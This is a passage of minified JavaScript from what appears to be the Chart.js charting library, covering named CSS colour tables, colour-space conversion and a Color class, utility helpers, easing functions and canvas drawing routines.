mediumseagreen: [60, 179, 113], mediumslateblue: [123, 104, 238], mediumspringgreen: [0, 250, 154], mediumturquoise: [72, 209, 204], mediumvioletred: [199, 21, 133], midnightblue: [25, 25, 112], mintcream: [245, 255, 250], mistyrose: [255, 228, 225], moccasin: [255, 228, 181], navajowhite: [255, 222, 173], navy: [0, 0, 128], oldlace: [253, 245, 230], olive: [128, 128, 0], olivedrab: [107, 142, 35], orange: [255, 165, 0], orangered: [255, 69, 0], orchid: [218, 112, 214], palegoldenrod: [238, 232, 170], palegreen: [152, 251, 152], paleturquoise: [175, 238, 238], palevioletred: [219, 112, 147], papayawhip: [255, 239, 213], peachpuff: [255, 218, 185], peru: [205, 133, 63], pink: [255, 192, 203], plum: [221, 160, 221], powderblue: [176, 224, 230], purple: [128, 0, 128], rebeccapurple: [102, 51, 153], red: [255, 0, 0], rosybrown: [188, 143, 143], royalblue: [65, 105, 225], saddlebrown: [139, 69, 19], salmon: [250, 128, 114], sandybrown: [244, 164, 96], seagreen: [46, 139, 87], seashell: [255, 245, 238], sienna: [160, 82, 45], silver: [192, 192, 192], skyblue: [135, 206, 235], slateblue: [106, 90, 205], slategray: [112, 128, 144], slategrey: [112, 128, 144], snow: [255, 250, 250], springgreen: [0, 255, 127], steelblue: [70, 130, 180], tan: [210, 180, 140], teal: [0, 128, 128], thistle: [216, 191, 216], tomato: [255, 99, 71], turquoise: [64, 224, 208], violet: [238, 130, 238], wheat: [245, 222, 179], white: [255, 255, 255], whitesmoke: [245, 245, 245], yellow: [255, 255, 0], yellowgreen: [154, 205, 50] }, x = {}; for (var t in v) x[JSON.stringify(v[t])] = t; function F() { return new S } for (var Q in o) { F[Q + "Raw"] = function (e) { return function (t) { return "number" == typeof t && (t = Array.prototype.slice.call(arguments)), o[e](t) } }(Q); var G = /(\w+)2(\w+)/.exec(Q), w = G[1], X = G[2]; (F[w] = F[w] || {})[X] = F[Q] = function (i) { return function (t) { "number" == typeof t && (t = Array.prototype.slice.call(arguments)); var e = o[i](t); if ("string" == typeof e || void 0 === e) return e; for (var n = 0; n < e.length; n++)e[n] = Math.round(e[n]); return e } }(Q) } var S = function () { this.convs = {} }; S.prototype.routeSpace = function (t, e) { var n = e[0]; return void 0 === n ? this.getValues(t) : ("number" == typeof n && (n = Array.prototype.slice.call(e)), this.setValues(t, n)) }, S.prototype.setValues = function (t, e) { return this.space = t, this.convs = {}, this.convs[t] = e, this }, S.prototype.getValues = function (t) { var e, n, i = this.convs[t]; return i || (e = this.space, n = this.convs[e], i = F[e][t](n), this.convs[t] = i), i }, ["rgb", "hsl", "hsv", "cmyk", "keyword"].forEach(function (e) { S.prototype[e] = function (t) { return this.routeSpace(e, arguments) } }); var k = F, D = { aliceblue: [240, 248, 255], antiquewhite: [250, 235, 215], aqua: [0, 255, 255], aquamarine: [127, 255, 212], azure: [240, 255, 255], beige: [245, 245, 220], bisque: [255, 228, 196], black: [0, 0, 0], blanchedalmond: [255, 235, 205], blue: [0, 0, 255], blueviolet: [138, 43, 226], brown: [165, 42, 42], burlywood: [222, 184, 135], cadetblue: [95, 158, 160], chartreuse: [127, 255, 0], chocolate: [210, 105, 30], coral: [255, 127, 80], cornflowerblue: [100, 149, 237], cornsilk: [255, 248, 220], crimson: [220, 20, 60], cyan: [0, 255, 255], darkblue: [0, 0, 139], darkcyan: [0, 139, 139], darkgoldenrod: [184, 134, 11], darkgray: [169, 169, 169], darkgreen: [0, 100, 0], darkgrey: [169, 169, 169], darkkhaki: [189, 183, 107], darkmagenta: [139, 0, 139], darkolivegreen: [85, 107, 47], darkorange: [255, 140, 0], darkorchid: [153, 50, 204], darkred: [139, 0, 0], darksalmon: [233, 150, 122], darkseagreen: [143, 188, 143], darkslateblue: [72, 61, 139], darkslategray: [47, 79, 79], darkslategrey: [47, 79, 79], darkturquoise: [0, 206, 209], darkviolet: [148, 0, 211], deeppink: [255, 20, 147], deepskyblue: [0, 191, 255], dimgray: [105, 105, 105], dimgrey: [105, 105, 105], dodgerblue: [30, 144, 255], firebrick: [178, 34, 34], floralwhite: [255, 250, 240], forestgreen: [34, 139, 34], fuchsia: [255, 0, 255], gainsboro: [220, 220, 220], ghostwhite: [248, 248, 255], gold: [255, 215, 0], goldenrod: [218, 165, 32], gray: [128, 128, 128], green: [0, 128, 0], greenyellow: [173, 255, 47], grey: [128, 128, 128], honeydew: [240, 255, 240], hotpink: [255, 105, 180], indianred: [205, 92, 92], indigo: [75, 0, 130], ivory: [255, 255, 240], khaki: [240, 230, 140], lavender: [230, 230, 250], lavenderblush: [255, 240, 245], lawngreen: [124, 252, 0], lemonchiffon: [255, 250, 205], lightblue: [173, 216, 230], lightcoral: [240, 128, 128], lightcyan: [224, 255, 255], lightgoldenrodyellow: [250, 250, 210], lightgray: [211, 211, 211], lightgreen: [144, 238, 144], lightgrey: [211, 211, 211], lightpink: [255, 182, 193], lightsalmon: [255, 160, 122], lightseagreen: [32, 178, 170], lightskyblue: [135, 206, 250], lightslategray: [119, 136, 153], lightslategrey: [119, 136, 153], lightsteelblue: [176, 196, 222], lightyellow: [255, 255, 224], lime: [0, 255, 0], limegreen: [50, 205, 50], linen: [250, 240, 230], magenta: [255, 0, 255], maroon: [128, 0, 0], mediumaquamarine: [102, 205, 170], mediumblue: [0, 0, 205], mediumorchid: [186, 85, 211], mediumpurple: [147, 112, 219], mediumseagreen: [60, 179, 113], mediumslateblue: [123, 104, 238], mediumspringgreen: [0, 250, 154], mediumturquoise: [72, 209, 204], mediumvioletred: [199, 21, 133], midnightblue: [25, 25, 112], mintcream: [245, 255, 250], mistyrose: [255, 228, 225], moccasin: [255, 228, 181], navajowhite: [255, 222, 173], navy: [0, 0, 128], oldlace: [253, 245, 230], olive: [128, 128, 0], olivedrab: [107, 142, 35], orange: [255, 165, 0], orangered: [255, 69, 0], orchid: [218, 112, 214], palegoldenrod: [238, 232, 170], palegreen: [152, 251, 152], paleturquoise: [175, 238, 238], palevioletred: [219, 112, 147], papayawhip: [255, 239, 213], peachpuff: [255, 218, 185], peru: [205, 133, 63], pink: [255, 192, 203], plum: [221, 160, 221], powderblue: [176, 224, 230], purple: [128, 0, 128], rebeccapurple: [102, 51, 153], red: [255, 0, 0], rosybrown: [188, 143, 143], royalblue: [65, 105, 225], saddlebrown: [139, 69, 19], salmon: [250, 128, 114], sandybrown: [244, 164, 96], seagreen: [46, 139, 87], seashell: [255, 245, 238], sienna: [160, 82, 45], silver: [192, 192, 192], skyblue: [135, 206, 235], slateblue: [106, 90, 205], slategray: [112, 128, 144], slategrey: [112, 128, 144], snow: [255, 250, 250], springgreen: [0, 255, 127], steelblue: [70, 130, 180], tan: [210, 180, 140], teal: [0, 128, 128], thistle: [216, 191, 216], tomato: [255, 99, 71], turquoise: [64, 224, 208], violet: [238, 130, 238], wheat: [245, 222, 179], white: [255, 255, 255], whitesmoke: [245, 245, 245], yellow: [255, 255, 0], yellowgreen: [154, 205, 50] }, Z = { getRgba: U, getHsla: W, getRgb: function (t) { var e = U(t); return e && e.slice(0, 3) }, getHsl: function (t) { var e = W(t); return e && e.slice(0, 3) }, getHwb: N, getAlpha: function (t) { var e = U(t); { if (e) return e[3]; if (e = W(t)) return e[3]; if (e = N(t)) return e[3] } }, hexString: function (t, e) { e = void 0 !== e && 3 === t.length ? e : t[3]; return "#" + Y(t[0]) + Y(t[1]) + Y(t[2]) + (0 <= e && e < 1 ? Y(Math.round(255 * e)) : "") }, rgbString: function (t, e) { if (e < 1 || t[3] && t[3] < 1) return T(t, e); return "rgb(" + t[0] + ", " + t[1] + ", " + t[2] + ")" }, rgbaString: T, percentString: function (t, e) { if (e < 1 || t[3] && t[3] < 1) return H(t, e); var n = Math.round(t[0] / 255 * 100), i = Math.round(t[1] / 255 * 100), o = Math.round(t[2] / 255 * 100); return "rgb(" + n + "%, " + i + "%, " + o + "%)" }, percentaString: H, hslString: function (t, e) { if (e < 1 || t[3] && t[3] < 1) return E(t, e); return "hsl(" + t[0] + ", " + t[1] + "%, " + t[2] + "%)" }, hslaString: E, hwbString: function (t, e) { void 0 === e && (e = void 0 !== t[3] ? t[3] : 1); return "hwb(" + t[0] + ", " + t[1] + "%, " + t[2] + "%" + (void 0 !== e && 1 !== e ? ", " + e : "") + ")" }, keyword: function (t) { return O[t.slice(0, 3)] } }; function U(t) { if (t) { var e = [0, 0, 0], n = 1, i = t.match(/^#([a-fA-F0-9]{3,4})$/i), o = ""; if (i) { o = (i = i[1])[3]; for (var a = 0; a < e.length; a++)e[a] = parseInt(i[a] + i[a], 16); o && (n = Math.round(parseInt(o + o, 16) / 255 * 100) / 100) } else if (i = t.match(/^#([a-fA-F0-9]{6}([a-fA-F0-9]{2})?)$/i)) { o = i[2], i = i[1]; for (a = 0; a < e.length; a++)e[a] = parseInt(i.slice(2 * a, 2 * a + 2), 16); o && (n = Math.round(parseInt(o, 16) / 255 * 100) / 100) } else if (i = t.match(/^rgba?\(\s*([+-]?\d+)\s*,\s*([+-]?\d+)\s*,\s*([+-]?\d+)\s*(?:,\s*([+-]?[\d\.]+)\s*)?\)$/i)) { for (a = 0; a < e.length; a++)e[a] = parseInt(i[a + 1]); n = parseFloat(i[4]) } else if (i = t.match(/^rgba?\(\s*([+-]?[\d\.]+)\%\s*,\s*([+-]?[\d\.]+)\%\s*,\s*([+-]?[\d\.]+)\%\s*(?:,\s*([+-]?[\d\.]+)\s*)?\)$/i)) { for (a = 0; a < e.length; a++)e[a] = Math.round(2.55 * parseFloat(i[a + 1])); n = parseFloat(i[4]) } else if (i = t.match(/(\w+)/)) { if ("transparent" == i[1]) return [0, 0, 0, 0]; if (!(e = D[i[1]])) return } for (a = 0; a < e.length; a++)e[a] = R(e[a], 0, 255); return n = n || 0 == n ? R(n, 0, 1) : 1, e[3] = n, e } } function W(t) { if (t) { var e = t.match(/^hsla?\(\s*([+-]?\d+)(?:deg)?\s*,\s*([+-]?[\d\.]+)%\s*,\s*([+-]?[\d\.]+)%\s*(?:,\s*([+-]?[\d\.]+)\s*)?\)/); if (e) { var n = parseFloat(e[4]); return [R(parseInt(e[1]), 0, 360), R(parseFloat(e[2]), 0, 100), R(parseFloat(e[3]), 0, 100), R(isNaN(n) ? 1 : n, 0, 1)] } } } function N(t) { if (t) { var e = t.match(/^hwb\(\s*([+-]?\d+)(?:deg)?\s*,\s*([+-]?[\d\.]+)%\s*,\s*([+-]?[\d\.]+)%\s*(?:,\s*([+-]?[\d\.]+)\s*)?\)/); if (e) { var n = parseFloat(e[4]); return [R(parseInt(e[1]), 0, 360), R(parseFloat(e[2]), 0, 100), R(parseFloat(e[3]), 0, 100), R(isNaN(n) ? 1 : n, 0, 1)] } } } function T(t, e) { return void 0 === e && (e = void 0 !== t[3] ? t[3] : 1), "rgba(" + t[0] + ", " + t[1] + ", " + t[2] + ", " + e + ")" } function H(t, e) { return "rgba(" + Math.round(t[0] / 255 * 100) + "%, " + Math.round(t[1] / 255 * 100) + "%, " + Math.round(t[2] / 255 * 100) + "%, " + (e || t[3] || 1) + ")" } function E(t, e) { return void 0 === e && (e = void 0 !== t[3] ? t[3] : 1), "hsla(" + t[0] + ", " + t[1] + "%, " + t[2] + "%, " + e + ")" } function R(t, e, n) { return Math.min(Math.max(e, t), n) } function Y(t) { var e = t.toString(16).toUpperCase(); return e.length < 2 ? "0" + e : e } var O = {}; for (var _ in D) O[D[_]] = _; var V = function (t) { return t instanceof V ? t : this instanceof V ? (this.valid = !1, this.values = { rgb: [0, 0, 0], hsl: [0, 0, 0], hsv: [0, 0, 0], hwb: [0, 0, 0], cmyk: [0, 0, 0, 0], alpha: 1 }, void ("string" == typeof t ? (e = Z.getRgba(t)) ? this.setValues("rgb", e) : (e = Z.getHsla(t)) ? this.setValues("hsl", e) : (e = Z.getHwb(t)) && this.setValues("hwb", e) : "object" == typeof t && (void 0 !== (e = t).r || void 0 !== e.red ? this.setValues("rgb", e) : void 0 !== e.l || void 0 !== e.lightness ? this.setValues("hsl", e) : void 0 !== e.v || void 0 !== e.value ? this.setValues("hsv", e) : void 0 !== e.w || void 0 !== e.whiteness ? this.setValues("hwb", e) : void 0 === e.c && void 0 === e.cyan || this.setValues("cmyk", e)))) : new V(t); var e }; V.prototype = { isValid: function () { return this.valid }, rgb: function () { return this.setSpace("rgb", arguments) }, hsl: function () { return this.setSpace("hsl", arguments) }, hsv: function () { return this.setSpace("hsv", arguments) }, hwb: function () { return this.setSpace("hwb", arguments) }, cmyk: function () { return this.setSpace("cmyk", arguments) }, rgbArray: function () { return this.values.rgb }, hslArray: function () { return this.values.hsl }, hsvArray: function () { return this.values.hsv }, hwbArray: function () { var t = this.values; return 1 !== t.alpha ? t.hwb.concat([t.alpha]) : t.hwb }, cmykArray: function () { return this.values.cmyk }, rgbaArray: function () { var t = this.values; return t.rgb.concat([t.alpha]) }, hslaArray: function () { var t = this.values; return t.hsl.concat([t.alpha]) }, alpha: function (t) { return void 0 === t ? this.values.alpha : (this.setValues("alpha", t), this) }, red: function (t) { return this.setChannel("rgb", 0, t) }, green: function (t) { return this.setChannel("rgb", 1, t) }, blue: function (t) { return this.setChannel("rgb", 2, t) }, hue: function (t) { return t = t && ((t %= 360) < 0 ? 360 + t : t), this.setChannel("hsl", 0, t) }, saturation: function (t) { return this.setChannel("hsl", 1, t) }, lightness: function (t) { return this.setChannel("hsl", 2, t) }, saturationv: function (t) { return this.setChannel("hsv", 1, t) }, whiteness: function (t) { return this.setChannel("hwb", 1, t) }, blackness: function (t) { return this.setChannel("hwb", 2, t) }, value: function (t) { return this.setChannel("hsv", 2, t) }, cyan: function (t) { return this.setChannel("cmyk", 0, t) }, magenta: function (t) { return this.setChannel("cmyk", 1, t) }, yellow: function (t) { return this.setChannel("cmyk", 2, t) }, black: function (t) { return this.setChannel("cmyk", 3, t) }, hexString: function () { return Z.hexString(this.values.rgb) }, rgbString: function () { return Z.rgbString(this.values.rgb, this.values.alpha) }, rgbaString: function () { return Z.rgbaString(this.values.rgb, this.values.alpha) }, percentString: function () { return Z.percentString(this.values.rgb, this.values.alpha) }, hslString: function () { return Z.hslString(this.values.hsl, this.values.alpha) }, hslaString: function () { return Z.hslaString(this.values.hsl, this.values.alpha) }, hwbString: function () { return Z.hwbString(this.values.hwb, this.values.alpha) }, keyword: function () { return Z.keyword(this.values.rgb, this.values.alpha) }, rgbNumber: function () { var t = this.values.rgb; return t[0] << 16 | t[1] << 8 | t[2] }, luminosity: function () { for (var t = this.values.rgb, e = [], n = 0; n < t.length; n++) { var i = t[n] / 255; e[n] = i <= .03928 ? i / 12.92 : Math.pow((.055 + i) / 1.055, 2.4) } return .2126 * e[0] + .7152 * e[1] + .0722 * e[2] }, contrast: function (t) { var e = this.luminosity(), n = t.luminosity(); return n < e ? (e + .05) / (n + .05) : (n + .05) / (e + .05) }, level: function (t) { var e = this.contrast(t); return 7.1 <= e ? "AAA" : 4.5 <= e ? "AA" : "" }, dark: function () { var t = this.values.rgb; return (299 * t[0] + 587 * t[1] + 114 * t[2]) / 1e3 < 128 }, light: function () { return !this.dark() }, negate: function () { for (var t = [], e = 0; e < 3; e++)t[e] = 255 - this.values.rgb[e]; return this.setValues("rgb", t), this }, lighten: function (t) { var e = this.values.hsl; return e[2] += e[2] * t, this.setValues("hsl", e), this }, darken: function (t) { var e = this.values.hsl; return e[2] -= e[2] * t, this.setValues("hsl", e), this }, saturate: function (t) { var e = this.values.hsl; return e[1] += e[1] * t, this.setValues("hsl", e), this }, desaturate: function (t) { var e = this.values.hsl; return e[1] -= e[1] * t, this.setValues("hsl", e), this }, whiten: function (t) { var e = this.values.hwb; return e[1] += e[1] * t, this.setValues("hwb", e), this }, blacken: function (t) { var e = this.values.hwb; return e[2] += e[2] * t, this.setValues("hwb", e), this }, greyscale: function () { var t = this.values.rgb, e = .3 * t[0] + .59 * t[1] + .11 * t[2]; return this.setValues("rgb", [e, e, e]), this }, clearer: function (t) { var e = this.values.alpha; return this.setValues("alpha", e - e * t), this }, opaquer: function (t) { var e = this.values.alpha; return this.setValues("alpha", e + e * t), this }, rotate: function (t) { var e = this.values.hsl, n = (e[0] + t) % 360; return e[0] = n < 0 ? 360 + n : n, this.setValues("hsl", e), this }, mix: function (t, e) { var n = t, i = void 0 === e ? .5 : e, o = 2 * i - 1, a = this.alpha() - n.alpha(), s = (1 + (o * a == -1 ? o : (o + a) / (1 + o * a))) / 2, r = 1 - s; return this.rgb(s * this.red() + r * n.red(), s * this.green() + r * n.green(), s * this.blue() + r * n.blue()).alpha(this.alpha() * i + n.alpha() * (1 - i)) }, toJSON: function () { return this.rgb() }, clone: function () { var t, e, n = new V, i = this.values, o = n.values; for (var a in i) i.hasOwnProperty(a) && (t = i[a], "[object Array]" === (e = {}.toString.call(t)) ? o[a] = t.slice(0) : "[object Number]" === e ? o[a] = t : console.error("unexpected color value:", t)); return n } }, V.prototype.spaces = { rgb: ["red", "green", "blue"], hsl: ["hue", "saturation", "lightness"], hsv: ["hue", "saturation", "value"], hwb: ["hue", "whiteness", "blackness"], cmyk: ["cyan", "magenta", "yellow", "black"] }, V.prototype.maxes = { rgb: [255, 255, 255], hsl: [360, 100, 100], hsv: [360, 100, 100], hwb: [360, 100, 100], cmyk: [100, 100, 100, 100] }, V.prototype.getValues = function (t) { for (var e = this.values, n = {}, i = 0; i < t.length; i++)n[t.charAt(i)] = e[t][i]; return 1 !== e.alpha && (n.a = e.alpha), n }, V.prototype.setValues = function (t, e) { var n, i = this.values, o = this.spaces, a = this.maxes, s = 1; if (this.valid = !0, "alpha" === t) s = e; else if (e.length) i[t] = e.slice(0, t.length), s = e[t.length]; else if (void 0 !== e[t.charAt(0)]) { for (g = 0; g < t.length; g++)i[t][g] = e[t.charAt(g)]; s = e.a } else if (void 0 !== e[o[t][0]]) { for (var r = o[t], g = 0; g < t.length; g++)i[t][g] = e[r[g]]; s = e.alpha } if (i.alpha = Math.max(0, Math.min(1, void 0 === s ? i.alpha : s)), "alpha" === t) return !1; for (g = 0; g < t.length; g++)n = Math.max(0, Math.min(a[t][g], i[t][g])), i[t][g] = Math.round(n); for (var l in o) l !== t && (i[l] = k[t][l](i[t])); return !0 }, V.prototype.setSpace = function (t, e) { var n = e[0]; return void 0 === n ? this.getValues(t) : ("number" == typeof n && (n = Array.prototype.slice.call(e)), this.setValues(t, n), this) }, V.prototype.setChannel = function (t, e, n) { var i = this.values[t]; return void 0 === n ? i[e] : (n === i[e] || (i[e] = n, this.setValues(t, i)), this) }, "undefined" != typeof window && (window.Color = V); var L, M = V, z = { noop: function () { }, uid: (L = 0, function () { return L++ }), isNullOrUndef: function (t) { return null == t }, isArray: function (t) { if (Array.isArray && Array.isArray(t)) return !0; var e = Object.prototype.toString.call(t); return "[object" === e.substr(0, 7) && "Array]" === e.substr(-6) }, isObject: function (t) { return null !== t && "[object Object]" === Object.prototype.toString.call(t) }, isFinite: function (t) { return ("number" == typeof t || t instanceof Number) && isFinite(t) }, valueOrDefault: function (t, e) { return void 0 === t ? e : t }, valueAtIndexOrDefault: function (t, e, n) { return z.valueOrDefault(z.isArray(t) ? t[e] : t, n) }, callback: function (t, e, n) { if (t && "function" == typeof t.call) return t.apply(n, e) }, each: function (t, e, n, i) { var o, a, s; if (z.isArray(t)) if (a = t.length, i) for (o = a - 1; 0 <= o; o--)e.call(n, t[o], o); else for (o = 0; o < a; o++)e.call(n, t[o], o); else if (z.isObject(t)) for (a = (s = Object.keys(t)).length, o = 0; o < a; o++)e.call(n, t[s[o]], s[o]) }, arrayEquals: function (t, e) { var n, i, o, a; if (!t || !e || t.length !== e.length) return !1; for (n = 0, i = t.length; n < i; ++n)if (o = t[n], a = e[n], o instanceof Array && a instanceof Array) { if (!z.arrayEquals(o, a)) return !1 } else if (o !== a) return !1; return !0 }, clone: function (t) { if (z.isArray(t)) return t.map(z.clone); if (z.isObject(t)) { for (var e = {}, n = Object.keys(t), i = n.length, o = 0; o < i; ++o)e[n[o]] = z.clone(t[n[o]]); return e } return t }, _merger: function (t, e, n, i) { var o = e[t], a = n[t]; z.isObject(o) && z.isObject(a) ? z.merge(o, a, i) : e[t] = z.clone(a) }, _mergerIf: function (t, e, n) { var i = e[t], o = n[t]; z.isObject(i) && z.isObject(o) ? z.mergeIf(i, o) : e.hasOwnProperty(t) || (e[t] = z.clone(o)) }, merge: function (t, e, n) { var i, o, a, s, r, g = z.isArray(e) ? e : [e], l = g.length; if (!z.isObject(t)) return t; for (i = (n = n || {}).merger || z._merger, o = 0; o < l; ++o)if (e = g[o], z.isObject(e)) for (r = 0, s = (a = Object.keys(e)).length; r < s; ++r)i(a[r], t, e, n); return t }, mergeIf: function (t, e) { return z.merge(t, e, { merger: z._mergerIf }) }, extend: function (n) { for (var t = function (t, e) { n[e] = t }, e = 1, i = arguments.length; e < i; ++e)z.each(arguments[e], t); return n }, inherits: function (t) { function e() { this.constructor = i } var n = this, i = t && t.hasOwnProperty("constructor") ? t.constructor : function () { return n.apply(this, arguments) }; return e.prototype = n.prototype, i.prototype = new e, i.extend = z.inherits, t && z.extend(i.prototype, t), i.__super__ = n.prototype, i } }, P = z; z.callCallback = z.callback, z.indexOf = function (t, e, n) { return Array.prototype.indexOf.call(t, e, n) }, z.getValueOrDefault = z.valueOrDefault, z.getValueAtIndexOrDefault = z.valueAtIndexOrDefault; var K = { linear: function (t) { return t }, easeInQuad: function (t) { return t * t }, easeOutQuad: function (t) { return -t * (t - 2) }, easeInOutQuad: function (t) { return (t /= .5) < 1 ? .5 * t * t : -.5 * (--t * (t - 2) - 1) }, easeInCubic: function (t) { return t * t * t }, easeOutCubic: function (t) { return --t * t * t + 1 }, easeInOutCubic: function (t) { return (t /= .5) < 1 ? .5 * t * t * t : .5 * ((t -= 2) * t * t + 2) }, easeInQuart: function (t) { return t * t * t * t }, easeOutQuart: function (t) { return -(--t * t * t * t - 1) }, easeInOutQuart: function (t) { return (t /= .5) < 1 ? .5 * t * t * t * t : -.5 * ((t -= 2) * t * t * t - 2) }, easeInQuint: function (t) { return t * t * t * t * t }, easeOutQuint: function (t) { return --t * t * t * t * t + 1 }, easeInOutQuint: function (t) { return (t /= .5) < 1 ? .5 * t * t * t * t * t : .5 * ((t -= 2) * t * t * t * t + 2) }, easeInSine: function (t) { return 1 - Math.cos(t * (Math.PI / 2)) }, easeOutSine: function (t) { return Math.sin(t * (Math.PI / 2)) }, easeInOutSine: function (t) { return -.5 * (Math.cos(Math.PI * t) - 1) }, easeInExpo: function (t) { return 0 === t ? 0 : Math.pow(2, 10 * (t - 1)) }, easeOutExpo: function (t) { return 1 === t ? 1 : 1 - Math.pow(2, -10 * t) }, easeInOutExpo: function (t) { return 0 === t ? 0 : 1 === t ? 1 : (t /= .5) < 1 ? .5 * Math.pow(2, 10 * (t - 1)) : .5 * (2 - Math.pow(2, -10 * --t)) }, easeInCirc: function (t) { return 1 <= t ? t : -(Math.sqrt(1 - t * t) - 1) }, easeOutCirc: function (t) { return Math.sqrt(1 - --t * t) }, easeInOutCirc: function (t) { return (t /= .5) < 1 ? -.5 * (Math.sqrt(1 - t * t) - 1) : .5 * (Math.sqrt(1 - (t -= 2) * t) + 1) }, easeInElastic: function (t) { var e = 1.70158, n = 0, i = 1; return 0 === t ? 0 : 1 === t ? 1 : (n = n || .3, e = i < 1 ? (i = 1, n / 4) : n / (2 * Math.PI) * Math.asin(1 / i), -(i * Math.pow(2, 10 * --t) * Math.sin((t - e) * (2 * Math.PI) / n))) }, easeOutElastic: function (t) { var e = 1.70158, n = 0, i = 1; return 0 === t ? 0 : 1 === t ? 1 : (n = n || .3, e = i < 1 ? (i = 1, n / 4) : n / (2 * Math.PI) * Math.asin(1 / i), i * Math.pow(2, -10 * t) * Math.sin((t - e) * (2 * Math.PI) / n) + 1) }, easeInOutElastic: function (t) { var e = 1.70158, n = 0, i = 1; return 0 === t ? 0 : 2 == (t /= .5) ? 1 : (n = n || .45, e = i < 1 ? (i = 1, n / 4) : n / (2 * Math.PI) * Math.asin(1 / i), t < 1 ? i * Math.pow(2, 10 * --t) * Math.sin((t - e) * (2 * Math.PI) / n) * -.5 : i * Math.pow(2, -10 * --t) * Math.sin((t - e) * (2 * Math.PI) / n) * .5 + 1) }, easeInBack: function (t) { return t * t * (2.70158 * t - 1.70158) }, easeOutBack: function (t) { return --t * t * (2.70158 * t + 1.70158) + 1 }, easeInOutBack: function (t) { var e = 1.70158; return (t /= .5) < 1 ? t * t * ((1 + (e *= 1.525)) * t - e) * .5 : .5 * ((t -= 2) * t * ((1 + (e *= 1.525)) * t + e) + 2) }, easeInBounce: function (t) { return 1 - K.easeOutBounce(1 - t) }, easeOutBounce: function (t) { return t < 1 / 2.75 ? 7.5625 * t * t : t < 2 / 2.75 ? 7.5625 * (t -= 1.5 / 2.75) * t + .75 : t < 2.5 / 2.75 ? 7.5625 * (t -= 2.25 / 2.75) * t + .9375 : 7.5625 * (t -= 2.625 / 2.75) * t + .984375 }, easeInOutBounce: function (t) { return t < .5 ? .5 * K.easeInBounce(2 * t) : .5 * K.easeOutBounce(2 * t - 1) + .5 } }, J = { effects: K }; P.easingEffects = K; var j = Math.PI, $ = j / 180, q = 2 * j, tt = j / 2, et = j / 4, nt = 2 * j / 3, it = { clear: function (t) { t.ctx.clearRect(0, 0, t.width, t.height) }, roundedRect: function (t, e, n, i, o, a) { var s, r, g, l, c; a ? (r = e + (s = Math.min(a, o / 2, i / 2)), g = n + s, l = e + i - s, c = n + o - s, t.moveTo(e, g), r < l && g < c ? (t.arc(r, g, s, -j, -tt), t.arc(l, g, s, -tt, 0), t.arc(l, c, s, 0, tt), t.arc(r, c, s, tt, j)) : r < l ? (t.moveTo(r, n), t.arc(l, g, s, -tt, tt), t.arc(r, g, s, tt, j + tt)) : g < c ? (t.arc(r, g, s, -j, 0), t.arc(r, c, s, 0, j)) : t.arc(r, g, s, -j, j), t.closePath(), t.moveTo(e, n)) : t.rect(e, n, i, o) }, drawPoint: function (t, e, n, i, o, a) { var s, r, g, l, c, I = (a || 0) * $; if (!e || "object" != typeof e || "[object HTMLImageElement]" !== (s = e.toString()) && "[object HTMLCanvasElement]" !== s) { if (!(isNaN(n) || n <= 0)) { switch (t.beginPath(), e) { default: t.arc(i, o, n, 0, q), t.closePath(); break; case "triangle": t.moveTo(i + Math.sin(I) * n, o - Math.cos(I) * n), I += nt, t.lineTo(i + Math.sin(I) * n, o - Math.cos(I) * n), I += nt, t.lineTo(i + Math.sin(I) * n, o - Math.cos(I) * n), t.closePath(); break; case "rectRounded": l = n - (c = .516 * n), r = Math.cos(I + et) * l, g = Math.sin(I + et) * l, t.arc(i - r, o - g, c, I - j, I - tt), t.arc(i + g, o - r, c, I - tt, I), t.arc(i + r, o + g, c, I, I + tt), t.arc(i - g, o + r, c, I + tt, I + j), t.closePath(); break; case "rect": if (!a) { l = Math.SQRT1_2 * n, t.rect(i - l, o - l, 2 * l, 2 * l); break } I += et; case "rectRot": r = Math.cos(I) * n, g = Math.sin(I) * n, t.moveTo(i - r, o - g), t.lineTo(i + g, o - r), t.lineTo(i + r, o + g), t.lineTo(i - g, o + r), t.closePath(); break; case "crossRot": I += et; case "cross": r = Math.cos(I) * n, g = Math.sin(I) * n, t.moveTo(i - r, o - g), t.lineTo(i + r, o + g), t.moveTo(i + g, o - r), t.lineTo(i - g, o + r); break; case "star": r = Math.cos(I) * n, g = Math.sin(I) * n, t.moveTo(i - r, o - g), t.lineTo(i + r, o + g), t.moveTo(i + g, o - r), t.lineTo(i - g, o + r), I += et, r = Math.cos(I) * n, g = Math.sin(I) * n, t.moveTo(i - r, o - g), t.lineTo(i + r, o + g), t.moveTo(i + g, o - r), t.lineTo(i - g, o + r); break; case "line": r = Math.cos(I) * n, g = Math.sin(I) * n, t.moveTo(i - r, o - g), t.lineTo(i + r, o + g); break; case "dash": t.moveTo(i, o), t.lineTo(i + Math.cos(I) * n, o + Math.sin(I) * n) }t.fill(), t.stroke() } } else t.drawImage(e, i - e.width / 2, o - e.height / 2, e.width, e.height) }, _isPointInArea: function (t, e) { return t.x > e.left - 1e-6 && t.x < e.right + 1e-6 && t.y > e.top - 1e-6 && t.y < e.bottom + 1e-6 }, clipArea: function (t, e) { t.save(), t.beginPath(), t.rect(e.left, e.top, e.right - e.left, e.bottom - e.top), t.clip() }, unclipArea: function (t) { t.restore() }, lineTo: function (t, e, n, i) { var o, a = n.steppedLine; if (a) return "middle" === a ? (o = (e.x + n.x) / 2, t.lineTo(o, i ? n.y : e.y), t.lineTo(o, i ? e.y : n.y)) : "after" === a && !i || "after" !== a && i ? t.lineTo(e.x, n.y) : t.lineTo(n.x, e.y), void t.lineTo(n.x, n.y); n.tension ? t.bezierCurveTo(i ? e.controlPointPreviousX : e.controlPointNextX, i ? e.controlPointPreviousY : e.controlPointNextY, i ? n.controlPointNextX : n.controlPointPreviousX, i ? n.controlPointNextY : n.controlPointPreviousY, n.x, n.y) : t.lineTo(n.x, n.y) } }, ot = it; P.clear = it.clear, P.drawRoundedRectangle = function (t) { t.beginPath(), it.roundedRect.apply(it, arguments) }; var at = { _set: function (t, e) { return P.merge(this[t] || (this[t] = {}), e) } }; at._set("global", { defaultColor: "rgba(0,0,0,0.1)", defaultFontColor: "#666", defaultFontFamily: "'Helvetica Neue', 'Helvetica', 'Arial', sans-serif", defaultFontSize: 12, defaultFontStyle: "normal", defaultLineHeight: 1.2, showLines: !0 }); var st = at, rt = P.valueOrDefault; var gt = { toLineHeight: function (t, e) { var n = ("" + t).match(/^(normal|(\d+(?:\.\d+)?)(px|em|%)?)$/); if (!n || "normal" === n[1]) return 1.2 * e; switch (t = +n[2], n[3]) { case "px": return t; case "%": t /= 100 }return e * t }, toPadding: function (t) { var e, n, i, o; return P.isObject(t) ? (e = +t.top || 0, 